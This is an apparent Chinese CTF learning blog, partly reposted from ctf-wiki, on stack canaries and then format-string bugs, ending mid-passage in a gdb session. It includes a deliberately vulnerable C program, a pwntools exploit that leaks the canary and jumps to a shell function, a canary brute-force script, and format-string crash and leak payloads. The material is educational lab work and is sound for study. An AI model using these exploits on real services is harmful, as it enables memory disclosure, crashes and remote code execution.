<p>Canary 不管是实现还是设计思想都比较简单高效，就是插入一个值在 stack overflow 发生的高危区域的尾部。当函数返回之时检测 Canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。</p>
<p>Canary 与 Windows 下的 GS 保护都是缓解栈溢出攻击的有效手段，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配。</p>
<h2 id="Canary-原理"><a href="#Canary-原理" class="headerlink" title="Canary 原理"></a>Canary 原理</h2><h3 id="在-GCC-中使用-Canary"><a href="#在-GCC-中使用-Canary" class="headerlink" title="在 GCC 中使用 Canary"></a>在 GCC 中使用 Canary</h3><p>可以在 GCC 中使用以下参数设置 Canary:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护<br>-fstack-protector-all 启用保护，为所有函数插入保护<br>-fstack-protector-strong<br>-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护<br>-fno-stack-protector 禁用保护<br></code></pre></td></tr></table></figure>

<h3 id="Canary-实现原理"><a href="#Canary-实现原理" class="headerlink" title="Canary 实现原理"></a>Canary 实现原理</h3><p>开启 Canary 保护的 stack 结构大概如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">  High<br>  Address |                 |<br>          +-----------------+<br>          | args            |<br>          +-----------------+<br>          | return address  |<br>          +-----------------+<br>  rbp =&gt;  | old ebp         |<br>          +-----------------+<br>rbp-8 =&gt;  | canary value    |<br>          +-----------------+<br>          | local variables |<br>  Low     |                 |<br>  Address<br><br></code></pre></td></tr></table></figure>

<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中ebp-0x8 的位置。<br>这个操作即为向栈中插入 Canary 值，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs asm">mov    rax, qword ptr fs:[0x28]<br>mov    qword ptr [rbp - 8], rax<br></code></pre></td></tr></table></figure>

<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs asm">mov    rdx,QWORD PTR [rbp-0x8]<br>xor    rdx,QWORD PTR fs:0x28<br>je     0x4005d7 &lt;main+65&gt;<br>call   0x400460 &lt;__stack_chk_fail@plt&gt;<br></code></pre></td></tr></table></figure>

<p>如果 Canary 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C">eglibc<span class="hljs-number">-2.19</span>/debug/stack_chk_fail.c<br><br><span class="hljs-keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="hljs-keyword">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这意味可以通过劫持 <code>__stack_chk_fail</code> 的 got 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容(参见 stack smash)。</p>
<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">void</span> *tcb;        <span class="hljs-comment">/* Pointer to the TCB.  Not necessarily the</span><br><span class="hljs-comment">                       thread descriptor used by libpthread.  */</span><br>  <span class="hljs-keyword">dtv_t</span> *dtv;<br>  <span class="hljs-keyword">void</span> *self;       <span class="hljs-comment">/* Pointer to the thread descriptor.  */</span><br>  <span class="hljs-keyword">int</span> multiple_threads;<br>  <span class="hljs-keyword">uintptr_t</span> sysinfo;<br>  <span class="hljs-keyword">uintptr_t</span> stack_guard;<br>  ...<br>&#125; <span class="hljs-keyword">tcbhead_t</span>;<br></code></pre></td></tr></table></figure>

<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</p>
<p>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">security_init</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br>  <span class="hljs-comment">// glibc直接使用了_dl_random的值并没有给赋值</span><br>  <span class="hljs-comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span><br><br>  <span class="hljs-comment">//将_dl_random的最后一个字节设置为0x0</span><br>  <span class="hljs-keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);<br>  <br>  <span class="hljs-comment">// 设置Canary的值到TLS中</span><br>  THREAD_SET_STACK_GUARD (stack_chk_guard);<br><br>  _dl_random = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span><br><span class="hljs-meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br><br></code></pre></td></tr></table></figure>


<h2 id="Canary-绕过技术"><a href="#Canary-绕过技术" class="headerlink" title="Canary 绕过技术"></a>Canary 绕过技术</h2><h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><p>Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用，在这里给出了常见的存在 Canary 的栈溢出利用思路，请注意每种方法都有特定的环境要求。</p>
<h3 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h3><p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串。<br>泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。<br>这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。</p>
<h4 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h4><p>存在漏洞的示例源代码如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// ex2.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getshell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>&#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">2</span>;i++)&#123;<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200</span>);<br>        <span class="hljs-built_in">printf</span>(buf);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    init();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello Hacker!&quot;</span>);<br>    vuln();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>编译为 32bit 程序并关闭 PIE 保护 （默认开启 NX，ASLR，Canary 保护）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ gcc -m32 -no-pie ex2.c -o ex2<br></code></pre></td></tr></table></figure>

<p>首先通过覆盖 Canary 最后一个 <code>\x00</code> 字节来打印出 4 位的 Canary<br>之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.binary = <span class="hljs-string">&#x27;ex2&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./ex2&#x27;</span>)<br><br>get_shell = ELF(<span class="hljs-string">&quot;./ex2&quot;</span>).sym[<span class="hljs-string">&quot;getshell&quot;</span>]<br><br>io.recvuntil(<span class="hljs-string">&quot;Hello Hacker!\n&quot;</span>)<br><br><span class="hljs-comment"># leak Canary</span><br>payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">100</span><br>io.sendline(payload)<br><br>io.recvuntil(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">100</span>)<br>Canary = u32(io.recv(<span class="hljs-number">4</span>))-<span class="hljs-number">0xa</span><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary))<br><br><span class="hljs-comment"># Bypass Canary</span><br>payload = <span class="hljs-string">&quot;\x90&quot;</span>*<span class="hljs-number">100</span>+p32(Canary)+<span class="hljs-string">&quot;\x90&quot;</span>*<span class="hljs-number">12</span>+p32(get_shell)<br>io.send(payload)<br><br>io.recv()<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="one-by-one-爆破-Canary"><a href="#one-by-one-爆破-Canary" class="headerlink" title="one-by-one 爆破 Canary"></a>one-by-one 爆破 Canary</h3><p>对于 Canary，虽然每次进程重启后的 Canary 不同(相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的， 并且<br>通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。<br>在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary:<br>这是爆破的 Python 代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Brute forcing stack canary &quot;</span><br><br>start = <span class="hljs-built_in">len</span>(p)<br>stop = <span class="hljs-built_in">len</span>(p)+<span class="hljs-number">8</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(p) &lt; stop:<br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>      res = send2server(p + <span class="hljs-built_in">chr</span>(i))<br><br>      <span class="hljs-keyword">if</span> res != <span class="hljs-string">&quot;&quot;</span>:<br>         p = p + <span class="hljs-built_in">chr</span>(i)<br>         <span class="hljs-comment">#print &quot;\t[+] Byte found 0x%02x&quot; % i</span><br>         <span class="hljs-keyword">break</span><br><br>      <span class="hljs-keyword">if</span> i == <span class="hljs-number">255</span>:<br>         <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] Exploit failed&quot;</span><br>         sys.exit(-<span class="hljs-number">1</span>)<br><br><br>canary = p[stop:start-<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>].encode(<span class="hljs-string">&quot;hex&quot;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;   [+] SSP value is 0x%s&quot;</span> % canary<br></code></pre></td></tr></table></figure>


<h3 id="劫持-stack-chk-fail函数"><a href="#劫持-stack-chk-fail函数" class="headerlink" title="劫持__stack_chk_fail函数"></a>劫持__stack_chk_fail函数</h3><p>已知 Canary 失败的处理逻辑会进入到 <code>__stack_chk_fail</code>ed 函数，<code>__stack_chk_fail</code>ed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p>
<p>参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 <code>__stack_chk_fail</code> 的 GOT 表，再进行 ROP 利用</p>
<h3 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h3><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p>
<p>参见 StarCTF2018 babystack</p>
<h1 id="二、例题"><a href="#二、例题" class="headerlink" title="二、例题"></a>二、例题</h1><h3 id="pwn04——来自ctfshow的pwn入门"><a href="#pwn04——来自ctfshow的pwn入门" class="headerlink" title="pwn04——来自ctfshow的pwn入门"></a>pwn04——来自ctfshow的pwn入门</h3><p>checksec一下<img src="2021-03-28-canary%E7%BB%95%E8%BF%87.assets/QQ%E5%9B%BE%E7%89%8720210328155307.png"></p>
<p>开启了nx，canary，部分relro等保护措施，</p>
<p><img src="2021-03-28-canary%E7%BB%95%E8%BF%87.assets/QQ%E5%9B%BE%E7%89%8720210328155500.png"></p>
<p><img src="2021-03-28-canary%E7%BB%95%E8%BF%87.assets/QQ%E5%9B%BE%E7%89%8720210328155325.png"></p>
<p>运行一下附件，发现可以把你输入的东西打印出来，还是重复两次，因此可以借此把canary泄露出来。（其实应该也看出来了吧，这里也有着很明显的字符串漏洞，所以还有一种解法就是去算canary的相对字符串的偏移，然后把它泄露出来）进入ida，函数很少，左边也能发现给出了系统函数，说明只要能正常覆盖返回地址就可以获取shell，点开buf进入栈中查看到canary的位置</p>
<p><img src="2021-03-28-canary%E7%BB%95%E8%BF%87.assets/QQ%E5%9B%BE%E7%89%8720210328155329.png"></p>
<p>计算一下buf到var_c的偏移，覆盖到Var_C的最后一位数，因为是0x00会造成截断，所以一同覆盖，到时候减去覆盖的值就行了</p>
<p><img src="2021-03-28-canary%E7%BB%95%E8%BF%87.assets/QQ%E5%9B%BE%E7%89%8720210328161657.png"></p>
<p>其实这题貌似就是上面当做例题的题目，可能是出题人也读过ctf wiki并且照着样子出的，tql！</p>
<h3 id="Mary-Morton——来自攻防世界进阶区"><a href="#Mary-Morton——来自攻防世界进阶区" class="headerlink" title="Mary_Morton——来自攻防世界进阶区"></a>Mary_Morton——来自攻防世界进阶区</h3><p>checksec 一下，查看保护<img src="2021-03-28-canary%E7%BB%95%E8%BF%87.assets/QQ%E5%9B%BE%E7%89%8720210328165236.png"></p>
<p>开启了部分relro，nx，canary</p>
<p><img src="2021-03-28-canary%E7%BB%95%E8%BF%87.assets/QQ%E5%9B%BE%E7%89%8720210328170729.png"></p>
<p><img src="2021-03-28-canary%E7%BB%95%E8%BF%87.assets/QQ%E5%9B%BE%E7%89%8720210328180109.png"></p>
<p><img src="2021-03-28-canary%E7%BB%95%E8%BF%87.assets/QQ%E5%9B%BE%E7%89%8720210328180112.png"></p>
<p>首先，主函数是个无限的循环结构，不停的可以进入三个分支，在第二个分支中有着字符串漏洞，第三个分支中有着栈溢出漏洞，如果只是简单处理，那就是先用字符串漏洞泄露canary的值，再用栈溢出进行跳转获取flag</p>
<p><img src="2021-03-28-canary%E7%BB%95%E8%BF%87.assets/QQ%E5%9B%BE%E7%89%8720210328175843.png"></p>
<p>在gdb中断点到printf中可以算出，canary是栈上的第18个变量，以及64位传参中前六个是寄存器传参，所以canary相对于字符串是第23个参数，也就是要写成%23$p，然后就正常算栈溢出偏移即可。exp如下：</p>
<p><img src="2021-03-28-canary%E7%BB%95%E8%BF%87.assets/QQ%E5%9B%BE%E7%89%8720210328185226.png"></p>
<p>但是我在攻防世界的wp中看见，有个大佬还拥有其他两个方式，方式1:输入2，利用格式化字符串将printf的got地址修改为system的plt地址，再次输入2，输入’/bin/sh\x00’，相当于执行system(‘/bin/sh\x00’)方式2:输入2，利用格式化字符串将exit的got地址修改为sub_4008DA函数地址（该函数可以直接执行cat./flag）,再次输入3，调用sub_4008DA函数catflag。详细可以到攻防世界自行查看，到大佬tql！！！！！！</p>
]]></content>
      <tags>
        <tag>canary</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞利用</title>
    <url>/2021/03/27/2021-03-27-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="转载自ctf-wiki"><a href="#转载自ctf-wiki" class="headerlink" title="转载自ctf-wiki"></a>转载自ctf-wiki</h1><h1 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h1><p>其实，在上一部分，我们展示了格式化字符串漏洞的两个利用手段</p>
<ul>
<li>使程序崩溃，因为%s对应的参数地址不合法的概率比较大。</li>
<li>查看进程内容，根据%d，%f输出了栈上的内容。</li>
</ul>
<p>下面我们会对于每一方面进行更加详细的解释。</p>
<h2 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h2><p>通常来说，利用格式化字符串漏洞使得程序崩溃是最为简单的利用方式，因为我们只需要输入若干个%s即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">%s%s%s%s%s%s%s%s%s%s%s%s%s%s<br></code></pre></td></tr></table></figure>

<p>这是因为栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。这一利用，虽然攻击者本身似乎并不能控制程序，但是这样却可以造成程序不可用。比如说，如果远程服务有一个格式化字符串漏洞，那么我们就可以攻击其可用性，使服务崩溃，进而使得用户不能够访问。</p>
<h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作</p>
<ul>
<li>泄露栈内存<ul>
<li>  获取某个变量的值</li>
<li>  获取某个变量对应地址的内存</li>
</ul>
</li>
<li>泄露任意地址内存<ul>
<li>  利用GOT表得到libc函数地址，进而获取libc，进而获取其它libc函数地址</li>
<li>  盲打，dump整个程序，获取有用信息。</li>
</ul>
</li>
</ul>
<h3 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h3><p>例如，给定如下程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">0x22222222</span>, c = <span class="hljs-number">-1</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>然后，我们简单编译一下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c<br>leakmemory.c: In function ‘main’:<br>leakmemory.c:7:10: warning: format not a string literal and no format arguments [-Wformat-security]<br>   printf(s);<br>          ^<br></code></pre></td></tr></table></figure>

<p>可以看出，编译器指出了我们的程序中没有给出格式化字符串的参数的问题。下面，我们来看一下，如何获取对应的栈内存。</p>
<p>根据C语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数(64位会根据其传参的规则进行获取)。这里我们主要介绍32位。</p>
<h4 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h4><p>首先，我们可以利用格式化字符串来获取栈上变量的数值。我们可以试一下，运行结果如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta">%</span><span class="bash">08x.%08x.%08x</span><br>00000001.22222222.ffffffff.%08x.%08x.%08x<br>ffcfc400.000000c2.f765a6bb<br></code></pre></td></tr></table></figure>

<p>可以看到，我们确实得到了一些内容。为了更加细致的观察，我们利用GDB来调试一下，以便于验证我们的想法，这里删除了一些不必要的信息，我们只关注代码段以及栈。</p>
<p>首先，启动程序，将断点下载printf函数处</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ gdb leakmemory<br>gef➤  b printf<br>Breakpoint 1 at 0x8048330<br></code></pre></td></tr></table></figure>

<p>之后，运行程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gef➤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br><span class="hljs-meta">%</span><span class="bash">08x.%08x.%08x</span><br></code></pre></td></tr></table></figure>

<p>此时，程序等待我们的输入，这时我们输入%08x.%08x.%08x，然后敲击回车，是程序继续运行，可以看出程序首先断在了第一次调用printf函数的位置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28	printf.c: 没有那个文件或目录.<br>────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>──────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccec│+0x00: 0x080484bf  →  &lt;main+84&gt; add esp, 0x20	 ← $esp<br>0xffffccf0│+0x04: 0x08048563  →  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4│+0x08: 0x00000001<br>0xffffccf8│+0x0c: 0x22222222<br>0xffffccfc│+0x10: 0xffffffff<br>0xffffcd00│+0x14: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd04│+0x18: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd08│+0x1c: 0x000000c2<br></code></pre></td></tr></table></figure>

<p>可以看出，此时此时已经进入了printf函数中，栈中第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为a的值，第四个变量为b的值，第五个变量为c的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gef➤  c<br>Continuing.<br>00000001.22222222.ffffffff.%08x.%08x.%08x<br><br></code></pre></td></tr></table></figure>

<p>可以看出，程序确实输出了每一个变量对应的数值，并且断在了下一个printf处</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Breakpoint 1, __printf (format=0xffffcd10 &quot;%08x.%08x.%08x&quot;) at printf.c:28<br>28	in printf.c<br>───────────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd04│+0x08: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: &quot;%08x.%08x.%08x&quot;	 ← $eax<br>0xffffcd14│+0x18: &quot;.%08x.%08x&quot;<br>0xffffcd18│+0x1c: &quot;x.%08x&quot;<br></code></pre></td></tr></table></figure>

<p>此时，由于格式化字符串为%x%x%x，所以，程序 会将栈上的0xffffcd04及其之后的数值分别作为第一，第二，第三个参数按照int型进行解析，分别输出。继续运行，我们可以得到如下结果去，确实和想象中的一样。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gef➤  c<br>Continuing.<br>ffffcd10.000000c2.f7e8b6bb[Inferior 1 (process 57077) exited normally]<br></code></pre></td></tr></table></figure>

<p>当然，我们也可以使用%p来获取数据，如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">%p.%p.%p<br><span class="hljs-number">00000001.22222222</span>.ffffffff.%p.%p.%p<br><span class="hljs-number">0xfff328c0</span><span class="hljs-number">.0</span>xc2<span class="hljs-number">.0</span>xf75c46bb<br></code></pre></td></tr></table></figure>

<p>这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。</p>
<p><strong>需要注意的是，我们上面给出的方法，都是依次获得栈中的每个参数，我们有没有办法直接获取呢</strong>？肯定是可以的啦。方法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">%n$x<br></code></pre></td></tr></table></figure>

<p>利用如下的字符串，我们就可以获取到对应的第n+1个参数的数值。为什么这里要说是对应第n+1个参数呢？这是因为格式化参数里面的n指的是该格式化字符串对应的第n个输出参数，那相对于输出函数来说，就是第n+1个参数了。</p>
<p>这里我们再次以gdb调试一下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ gdb leakmemory<br>gef➤  b printf<br>Breakpoint 1 at 0x8048330<br>gef➤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br><span class="hljs-meta">%</span><span class="bash">3<span class="hljs-variable">$x</span></span><br><br>Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28	printf.c: 没有那个文件或目录.<br><br>─────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      